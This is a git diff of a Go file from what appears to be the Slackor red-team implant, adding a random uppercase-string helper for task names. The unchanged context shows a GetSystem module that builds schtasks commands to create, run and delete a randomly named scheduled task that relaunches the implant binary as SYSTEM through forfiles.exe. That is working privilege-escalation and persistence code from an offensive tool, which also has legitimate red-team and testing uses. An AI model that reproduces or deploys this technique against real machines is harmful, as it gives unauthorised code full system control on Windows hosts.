@@ -3,12 +3,21 @@
 package windows
 
 import (
+	"math/rand"
 	"os"
 	"os/exec"
 	"syscall"
 
 	"github.com/Coalfire-Research/Slackor/pkg/command"
 )
+
+func randomString(len int) string { //Creates a random string of uppercase letters
+	bytes := make([]byte, len)
+	for i := 0; i < len; i++ {
+		bytes[i] = byte(65 + rand.Intn(25)) //A=65 and Z = 65+25
+	}
+	return string(bytes)
+}
 
 // GetSystem uses task scheduler to execute the binary as SYSTEM
 type GetSystem struct{}
@@ -20,7 +29,7 @@ func (g GetSystem) Name() string {
 
 // Run uses task scheduler to execute the binary as SYSTEM
 func (g GetSystem) Run(clientID string, jobID string, args []string) (string, error) {
-	taskname := RandomString(6)
+	taskname := randomString(6)
 	task1 := "schtasks /create /TN " + taskname + " /TR \"forfiles.exe /p c:\\windows\\system32 /m svchost.exe /c " + os.Args[0] + " \" /SC DAILY /RU system /F"
 	task2 := "schtasks /run /I /tn " + taskname
 	task3 := "schtasks /delete /TN " + taskname + " /f"
